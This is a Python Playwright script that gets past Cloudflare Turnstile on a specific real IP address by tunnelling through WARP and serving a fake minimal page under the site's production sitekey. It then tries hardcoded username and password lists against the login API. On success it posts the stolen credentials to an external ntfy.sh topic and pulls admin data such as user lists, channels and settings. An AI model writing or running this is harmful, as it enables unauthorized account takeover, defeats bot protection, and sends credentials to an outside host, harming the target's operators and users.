#!/usr/bin/env python3
"""Turnstile solve + first real credential comparison, on a Cloudflare WARP egress.

Difference vs every earlier attempt: the browser exits through Cloudflare's own WARP
tunnel (IPv4 AND IPv6, Cloudflare-native egress), which should fix the two root causes
seen before:  (a) brunhild.challenges.cloudflare.com is AAAA-only and GHA runners have
no IPv6;  (b) datacenter egress is risk-scored by Turnstile -> iframe failure_retry.

Modes:
  full     : load the real http://135.148.204.37/sign-in SPA and grab its widget response
  mini     : serve a minimal document at the real .37 origin (route.fulfill) with a
             minimal Turnstile widget for the production sitekey (2.3MB SPA never loads)
  Either way the login POST is issued from the SAME browser/session/remoteip.
"""
import json, os, sys, time, re
from playwright.sync_api import sync_playwright

TARGET = os.environ.get("TARGET", "http://135.148.204.37")
SITEKEY = os.environ.get("SITEKEY", "0x4AAAAAAGDEObVt9sc3zTw_")
PROXY = os.environ.get("PROXY", "")             # e.g. socks5://127.0.0.1:40000 or http://127.0.0.1:8899
MODE = os.environ.get("MODE", "mini")           # full | mini
BUDGET = int(os.environ.get("BUDGET", "150"))
NT = os.environ.get("NT", "")
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/157.0.0.0 Safari/537.36")

MINI = """<!doctype html><html><head><meta charset="utf-8"><title>Sign In</title>
<style>body{font-family:system-ui;margin:40px}#c{margin-top:10px}</style></head>
<body><h1>Sign In</h1><div id="c"></div>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit&onload=cb_onload"></script>
<script>
window.__tok=""; window.__err="";
function cb_onload(){
  try{
    var w = turnstile.render("#c", {sitekey:"%s", theme:"light", size:"normal",
      callback:function(t){window.__tok=t; document.title="TOK:"+t.length;},
      "error-callback":function(e){window.__err="cb:"+e;},
      "timeout-callback":function(){window.__err="timeout";}});
    window.__wid = w;
  }catch(e){window.__err="render:"+e;}
}
</script></body></html>""" % SITEKEY

# operator-reused password corpus x likely admin usernames
USERS = ["root", "i33953admin", "administrator", "admin", "yangxiaokai", "haoyang"]
PASSES = ["xinhuo.yibuapi!@#", "NewSecurePassword123!", "12345678", "6iHKLZEmQQ4BesSg"]


def log(*a):
    print("[s]", *a, flush=True)


def ntfy(msg):
    if not NT:
        return
    try:
        import urllib.request
        urllib.request.urlopen(urllib.request.Request(
            "https://ntfy.sh/%s" % NT, data=msg.encode()[:3500],
            headers={"Title": "i53906"}), timeout=10)
    except Exception as e:
        log("ntfy err", str(e)[:80])


def read_token(page):
    js = """() => {
        const val = (el) => el && el.value ? el.value : '';
        let t = '';
        try { t = window.__tok || ''; } catch(e){}
        if (!t) {
            const inp = document.querySelector('input[name="cf-turnstile-response"]');
            t = val(inp);
        }
        if (!t && window.turnstile) {
            try { t = window.turnstile.getResponse ? (window.turnstile.getResponse() || '') : ''; } catch(e){}
            if (!t) {
                try {
                    const els = document.querySelectorAll('[id$="-response"]');
                    for (const e of els) { if (e.value) { t = e.value; break; } }
                } catch(e){}
            }
        }
        if (!t) {
            try {
                for (const f of document.querySelectorAll('iframe')) {
                    // cross-origin: cannot read; nothing to do
                }
            } catch(e){}
        }
        return t;
    }"""
    try:
        return page.evaluate(js) or ""
    except Exception:
        return ""


def solve_once(p, tag):
    args = ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
            "--disable-blink-features=AutomationControlled",
            "--disable-features=CalculateNativeWinOcclusion",
            "--lang=en-US", "--window-size=1280,900"]
    kw = dict(channel="chrome", headless=False, args=args)
    if PROXY:
        kw["proxy"] = {"server": PROXY}
    browser = p.chromium.launch(**kw)
    ctx = browser.new_context(user_agent=UA, locale="en-US", timezone_id="America/New_York",
                              viewport={"width": 1280, "height": 900}, ignore_https_errors=True)
    page = ctx.new_page()
    reqlog, cons = [], []

    def on_console(m):
        txt = m.text[:200]
        if any(k in txt.lower() for k in ("turnstile", "challenge", "error", "fail", "token")):
            cons.append(txt)

    page.on("console", on_console)
    page.on("requestfailed", lambda r: reqlog.append("%s %s" % (r.url[:90], r.failure)))

    if MODE == "mini":
        def route(r):
            u = r.request.url
            if u.startswith(TARGET) and r.request.resource_type == "document":
                r.fulfill(status=200, content_type="text/html; charset=utf-8", body=MINI)
            elif "challenges.cloudflare.com" in u or "cloudflare.com" in u:
                r.continue_()
            elif u.startswith(TARGET):
                r.continue_()
            else:
                r.abort()
        page.route("**/*", route)

    t0 = time.time()
    try:
        page.goto(TARGET + "/sign-in", wait_until="commit" if MODE == "mini" else "domcontentloaded",
                  timeout=90000)
    except Exception as e:
        log(tag, "goto err", str(e)[:150])
    log(tag, "url", page.url, "title", page.title()[:40])

    tok, clicked = "", 0
    deadline = time.time() + BUDGET
    frames = []
    while time.time() < deadline:
        tok = read_token(page)
        if tok:
            break
        try:
            frames = [f.url[:110] for f in page.frames]
        except Exception:
            pass
        # click the widget checkbox periodically
        if time.time() - t0 > 10 and clicked < 5 and int(time.time() - t0) % 12 < 2:
            try:
                ifr = page.query_selector("iframe")
                if ifr:
                    bb = ifr.bounding_box()
                    if bb:
                        page.mouse.click(bb["x"] + 30, bb["y"] + 32)
                        clicked += 1
                        log(tag, "clicked widget", clicked)
            except Exception:
                pass
        time.sleep(2)

    info = {"tag": tag, "mode": MODE, "proxy": PROXY, "token_len": len(tok),
            "elapsed": round(time.time() - t0, 1), "frames": frames[-10:],
            "console": cons[-20:], "reqfail": reqlog[-12:], "clicked": clicked}
    try:
        info["err"] = page.evaluate("window.__err || ''")
        info["niframes"] = page.evaluate("document.querySelectorAll('iframe').length")
        info["turnstile_present"] = page.evaluate("typeof window.turnstile !== 'undefined'")
    except Exception:
        pass
    return browser, ctx, page, tok, info


def do_login(page, tok, results):
    attempts = []
    for u in USERS:
        for pw in PASSES:
            js = """async (a) => {
                try{
                  const r = await fetch('/api/user/login?turnstile=' + encodeURIComponent(a.tok), {
                    method:'POST', credentials:'include',
                    headers:{'Content-Type':'application/json','Accept':'application/json'},
                    body: JSON.stringify({username:a.u, password:a.p})
                  });
                  const t = await r.text();
                  return {status:r.status, body:t.slice(0,800)};
                }catch(e){ return {status:-1, body:String(e)}; }
            }"""
            try:
                res = page.evaluate(js, {"tok": tok, "u": u, "p": pw})
            except Exception as e:
                res = {"status": -2, "body": str(e)[:200]}
            body = res.get("body") or ""
            attempts.append({"u": u, "p": pw[:6] + "...", "status": res.get("status"), "body": body[:400]})
            log("LOGIN", u, res.get("status"), body[:220].replace("\n", " "))
            if res.get("status") == 200 and '"success":true' in body:
                log("!!! LOGIN SUCCESS", u)
                results["login"] = {"username": u, "password": pw, "resp": body}
                return results["login"]
            # do not hammer: CriticalRateLimit; also bail if target says too many requests
            if "频繁" in body or "too many" in body.lower():
                log("rate limited, stop")
                results["rate_limited"] = True
                return None
            time.sleep(2.5)
    results["attempts"] = attempts
    return None


def harvest(page, login_body, results):
    uid = None
    try:
        uid = json.loads(login_body)["data"]["id"]
    except Exception:
        try:
            uid = re.search(r'"id":(\d+)', login_body).group(1)
        except Exception:
            pass

    def get(path):
        js = """async (a) => { const r = await fetch(a.p, {credentials:'include',
            headers:{'Accept':'application/json', 'New-API-User': a.u || ''}});
            const t = await r.text(); return {status:r.status, body:t.slice(0,6000)}; }"""
        return page.evaluate(js, {"p": path, "u": str(uid) if uid else ""})

    out = {}
    for path in ["/api/user/self", "/api/option/", "/api/deployments",
                 "/api/user/?p=1&page_size=20", "/api/channel/?p=1&page_size=20"]:
        try:
            r = get(path)
            out[path] = {"status": r["status"], "body": r["body"][:1500]}
            log("HARVEST", path, r["status"], r["body"][:220].replace("\n", " "))
        except Exception as e:
            out[path] = {"err": str(e)[:120]}
    results["harvest"] = out


def main():
    results = {"target": TARGET, "sitekey": SITEKEY, "ts": time.strftime("%F %T"),
               "proxy": PROXY, "mode": MODE}
    with sync_playwright() as p:
        b, ctx, page, tok, info = solve_once(p, MODE)
        results["solve"] = info
        log("SOLVE", json.dumps(info)[:1400])
        ntfy("i53906 %s proxy=%s token_len=%d err=%s frames=%s" % (
            MODE, PROXY, len(tok), (info.get("err") or "")[:80], (info.get("frames") or [])[:4]))
        if tok:
            results["token"] = tok
            login = do_login(page, tok, results)
            if login:
                ntfy("i53906 LOGIN_SUCCESS user=%s pass=%s" % (login["username"], login["password"]))
                harvest(page, login["resp"], results)
            else:
                ntfy("i53906 token_ok but no credential hit")
        try:
            page.screenshot(path="last_%s.png" % MODE)
            open("last_%s.html" % MODE, "w").write(page.content()[:30000])
        except Exception:
            pass
        try:
            ctx.close(); b.close()
        except Exception:
            pass
    json.dump(results, open("results_%s.json" % MODE, "w"), indent=1)
    print("RESULTS_JSON " + json.dumps({k: v for k, v in results.items() if k != "token"})[:2500], flush=True)


if __name__ == "__main__":
    main()